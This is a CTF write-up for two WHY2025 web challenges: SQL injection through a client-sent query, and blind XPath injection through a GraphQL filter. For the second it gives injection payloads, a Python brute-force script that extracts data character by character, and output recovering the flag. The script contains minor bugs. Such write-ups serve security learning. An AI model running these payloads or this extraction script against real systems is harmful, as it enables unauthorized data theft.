-------------------

### CTF: WHY2025 CTF Teaser

-------------------

![image](https://github.com/user-attachments/assets/5d7b39c1-2e1f-48da-a494-f818560ea6d0)

-------------------

### CHALLENGES-:

-------------------

- Web-:
  - Planets
  - Festival

-------------------

### PLANETS

-------------------

![image](https://github.com/user-attachments/assets/f1fb9132-28d3-4135-a6d5-9385277c245d)

------------------

- Source Code as seen with view-source-:

```js
try {
            fetch("/api.php", {
                method: "POST",
                body: "query=SELECT * FROM planets",
                headers: {"Content-type": "application/x-www-form-urlencoded; charset=UTF-8"},
            })
            .then(response => response.json())
            .then(response => addPlanets(response))
        } catch (error) {
            console.error(error.message);
        }
```

- The code above is a js ajax request  making a post request to php page `/api.php`.The interesting part is the body which contains sql query sent to the server.We can manipulate the input to read other data from the database.

```js
 body: "query=SELECT * FROM planets"
```

- I made a query to check for other tables with `SHOW TABLES`.We have an interesting rresult `abandoned_planets`.

![image](https://github.com/user-attachments/assets/0153717f-8f47-4652-ad06-918200fe2a6e)

- The next step is to read the columns with `select * from abandoned_planets`.I got the flag with that statement.

![image](https://github.com/user-attachments/assets/17fc2858-fec1-4bf2-a46b-1ac5fe0ef5a1)

- Flag-:`flag{54de9e7dbee502cdc153cec4e0abfb38}`

----------------------

### FESTIVALS

-----------------------

![image](https://github.com/user-attachments/assets/4c2dc171-a7bc-44cb-a0d2-5d9e977649ad)

-----------------------

- This target uses the graphl language but it is vulnerable to XPATH injection which is a vulnerability that affect websites that use `XPATH` to interact with `XML databases`.The exploitation chain in summary is `graphql` to `xpath injection`.
- I spotted the vulnerability with the error `Invalid Predicate` in the result.This StackOverflow [post](https://stackoverflow.com/questions/33830821/python-xpath-syntaxerror-invalid-predicate) associated the error to XPATH.

![image](https://github.com/user-attachments/assets/f9a7a19c-4d5a-491d-b990-bc265e2200b1)

- I followed the steps this [blogpost](https://www.vaadata.com/blog/xpath-injections-exploitations-and-security-tips/) to exploit the vulnerability but I modified the code slightly to exploit the target.
- XPATH is like sql injection and the backend react differently to `TRUE` or `False` statements.In the case of a `TRUE` statement,we get the data related to id `1`.

![image](https://github.com/user-attachments/assets/f60082cd-397d-4787-9006-b73feb7112a5)

- But, in a false statement,we get none.

![image](https://github.com/user-attachments/assets/4a8da922-7e7d-442f-bb98-6e78953612ce)

- This target is vulnerable to `XPATH blind injection`,we'll have to exfiltrate data based on `TRUE` and `FALSE` statemeent.In our case, if the statement is true,we get the data of id `1` but if it is false,we get none.
- In Xpath,we have the root node and other child nodes e.g `/root/` -> `[root node]`,`/root/mead/` ->`[Meager is the child node]`.The firsst step is to find the string-length of the root node with the query below.It is done with the string-length() function.Value 3 should be iterated.

```xpath
string-length(name(/*[1]))=3
```
- I wrote a POC for it.

![image](https://github.com/user-attachments/assets/4cae27fb-b329-432c-a8b7-b1134612e19f)

- The root-node has 4 characters-:

![image](https://github.com/user-attachments/assets/c93f9376-0cda-4a57-9d5d-0282ecfe4ae2)

- The next step is to read the characters with this function `substring()`.The char `d` should be replaced with characters.

```xpath
substring(name(/*[1]), 1, 1)=’d‘
```

- POC-:

![image](https://github.com/user-attachments/assets/8082e0ef-8b91-4111-9139-7b259fe854de)

- Result is `data`-:

![image](https://github.com/user-attachments/assets/11f15086-29fe-4296-9dfb-42160414a1a0)

- The next step is to count the amount of child_nodes with `count()` function.

```xpath
count(/[root node]/*)=2
```
- Count Nodes POC-:

![image](https://github.com/user-attachments/assets/890c0543-d525-4f11-8741-45a69c3ab399)

- 2 child nodes-:

![image](https://github.com/user-attachments/assets/9bf047e6-7d08-4bd7-9eaa-245b5bce01e7)

- After getting the child nodes,the next step requires reading a text node which contains a text string. It can be achieved with the  `substring()` but without the `name()` function because it can only be used to read child and root nodes.This should be the new syntax to get the string length-:

```xpath
string-length(/data/products/product[1])=4
```

- Read chars with-:

```xpath
substring(/data/ctf_s3cr3ts/secret_value_8761[1], 1, position[int])
```
- Poc-:

```python3
#! /usr/bin/env python3
import requests
from dataclasses import dataclass
import string
import json

@dataclass
class Exploit:
      url: str
      #Find string length
      def stringlength(self,limit: int,node: str,position: int) -> str:
          querydata = "{\n  festival(\n    filter: { \n      id: \"1\' and string-length(name({node}[{position}]))={length} and \'1\'=\'1\" \n    }\n  ) {\n    abbreviation\n    name\n    image\n    imagealt\n    description\n    year\n  }\n}\n\n"
          headers = {"Content-Type": "application/json"}
          for num in range(limit):
              replaced_data = querydata.replace('{length}',str(num))
              replaced_data = replaced_data.replace('{position}',str(position))
              query = {"query":replaced_data.replace('{node}',node)}
              text = requests.post(self.url,data=json.dumps(query),headers=headers).text
              ###Checks based on the length of id 1 -> 779
              if len(text) == 779:
                 print(f"[+]Node {node}'s string length: {num} ")
                 return num
                 break
      def childNodes(self,limit: int,node: str):
          querydata = "{\n  festival(\n    filter: { \n      id: \"1\' and count({node}})={number} and \'1\'=\'1\" \n    }\n  ) {\n    abbreviation\n    name\n    image\n    imagealt\n    description\n    year\n  }\n}\n\n"
          headers = {"Content-Type": "application/json"}
          for num in range(limit):
             replaced_data = querydata.replace('{number}',str(num))
             query = {"query":messed_data.replace('{node}',node)}
             text = requests.post(self.url,data=json.dumps(query),headers=headers).text
             if len(text) == 779:
                print(f"[+]Node {node} child nodes-: {i}")
                return str(num)
                break
      def readChars(self,stringlength: int,node: str,position: int):
           charset =  string.printable
           found = ""
           data = "{\n  festival(filter: {\n    id: \"1\' and substring(name({node}[{position}]), 1, offset)=\'{words}\' and \'1\'=\'1\"\n  }) {\n    abbreviation\n    name\n    image\n    imagealt\n    description\n    year\n  }\n}\n"
           headers = {"Content-Type": "application/json"}
           for i in range(stringlength + 1):
               for char in charset:
                   messed_query = data.replace("{words}",found+char)
                   messed_query = messed_query.replace("offset",str(i))
                   messed_query = messed_query.replace("{position}",str(position))
                   query =  {"query":messed_query.replace("{node}",node)}
                   text = requests.post(self.url,headers=headers,data=json.dumps(query)).text
                   if len(text) == 779:
                      found += char
                      print(f"[+] Found char-: {found}")
                      break
           return found
      def getTextNodeLength(self,limit: int,node: str,position: int) -> str:
          querydata = "{\n  festival(\n    filter: { \n      id: \"1\' and string-length({node}[{position}])={length} and \'1\'=\'1\" \n    }\n  ) {\n    abbreviation\n    name\n    image\n    imagealt\n    description\n    year\n  }\n}\n\n"
          headers = {"Content-Type": "application/json"}
          for num in range(limit):
              replaced_data = querydata.replace('{length}',str(num))
              replaced_data = replaced_data.replace('{position}',str(position))
              query = {"query":replaced_data.replace('{node}',node)}
              text = requests.post(self.url,data=json.dumps(query),headers=headers).text
              ###Checks based on the length of id 1 -> 779
              if len(text) == 779:
                 print(f"[+]Node {node}'s string length: {num} ")
                 return num
                 break
           
      def readTextNodeChars(self,textNodeLength: int,node:str,position: int):
           found = ""
           charset = string.printable
           data = "{\n  festival(filter: {\n    id: \"1\' and substring({node}[{position}], 1, offset)=\'{words}\' and \'1\'=\'1\"\n  }) {\n    abbreviation\n    name\n    image\n    imagealt\n    description\n    year\n  }\n}\n"
           headers = {"Content-Type": "application/json"}
           for i in range(textNodeLength + 1):
               for char in charset:
                   messed_query = data.replace("{words}",found+char)
                   messed_query = messed_query.replace("offset",str(i))
                   messed_query = messed_query.replace("{position}",str(position))
                   query =  {"query":messed_query.replace("{node}",node)}
                   text = requests.post(self.url,headers=headers,data=json.dumps(query)).text
                   if len(text) == 779:
                      found += char
                      print(f"[+] Found char-: {found}")
                      break
           return found

def main():
    exploit = Exploit("https://festivals.ctf.zone/graphql")
    #finding root node
    limit = 100
    length = exploit.getTextNodeLength(100,"/data/ctf_s3cr3ts/secret_value_8761",1)
    child_nodes = exploit.readTextNodeChars(length,"/data/ctf_s3cr3ts/secret_value_8761",1)
if __name__ == "__main__":
   main()
```
- Result-:

```cmd
▓   HP        Telegram Desktop  ❯  python festivalspoc.py
[+]Node /data/ctf_s3cr3ts/secret_value_8761's string length: 38
[+] Found char-: f
[+] Found char-: fl
[+] Found char-: fla
[+] Found char-: flag
[+] Found char-: flag{
[+] Found char-: flag{f
[+] Found char-: flag{f1
[+] Found char-: flag{f16
[+] Found char-: flag{f16c
[+] Found char-: flag{f16ce
[+] Found char-: flag{f16cee
[+] Found char-: flag{f16ceec
[+] Found char-: flag{f16ceec2
[+] Found char-: flag{f16ceec23
[+] Found char-: flag{f16ceec239
[+] Found char-: flag{f16ceec239b
[+] Found char-: flag{f16ceec239b5
[+] Found char-: flag{f16ceec239b54
[+] Found char-: flag{f16ceec239b54a
[+] Found char-: flag{f16ceec239b54ae
[+] Found char-: flag{f16ceec239b54aec
[+] Found char-: flag{f16ceec239b54aec5
[+] Found char-: flag{f16ceec239b54aec5e
[+] Found char-: flag{f16ceec239b54aec5e7
[+] Found char-: flag{f16ceec239b54aec5e74
[+] Found char-: flag{f16ceec239b54aec5e74c
[+] Found char-: flag{f16ceec239b54aec5e74c8
[+] Found char-: flag{f16ceec239b54aec5e74c87
[+] Found char-: flag{f16ceec239b54aec5e74c87c
[+] Found char-: flag{f16ceec239b54aec5e74c87c4
[+] Found char-: flag{f16ceec239b54aec5e74c87c4c
[+] Found char-: flag{f16ceec239b54aec5e74c87c4c3
[+] Found char-: flag{f16ceec239b54aec5e74c87c4c30
[+] Found char-: flag{f16ceec239b54aec5e74c87c4c302
[+] Found char-: flag{f16ceec239b54aec5e74c87c4c302a
[+] Found char-: flag{f16ceec239b54aec5e74c87c4c302a1
[+] Found char-: flag{f16ceec239b54aec5e74c87c4c302a12
[+] Found char-: flag{f16ceec239b54aec5e74c87c4c302a12}
```

- Flag-: ` flag{f16ceec239b54aec5e74c87c4c302a12}`

![image](https://github.com/user-attachments/assets/524b7689-774c-4e76-a230-5d2071034727)

------------------

### REFERENCES-:

------------------

- [Invalid Predicate](https://stackoverflow.com/questions/33830821/python-xpath-syntaxerror-invalid-predicate)
- [Vaadata](https://www.vaadata.com/blog/xpath-injections-exploitations-and-security-tips/)

------------------
